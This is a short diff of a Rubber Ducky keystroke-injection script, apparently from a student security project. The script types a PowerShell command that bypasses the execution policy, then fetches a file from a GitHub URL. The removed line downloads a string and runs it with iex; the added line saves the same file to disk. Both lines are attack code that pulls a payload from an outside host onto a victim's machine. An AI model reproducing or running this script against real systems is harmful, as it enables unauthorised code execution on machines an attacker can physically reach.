@@ -8,5 +8,6 @@ STRING Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
 DELAY 1000
 ENTER
 DELAY 1000
-STRING iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ngskoog/6841_project/refs/heads/main/ducky_float.jpg')
+STRING (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/ngskoog/6841_project/main/scripts/ducky_float.jpg', 'ducky_float.jpg')
 ENTER
+
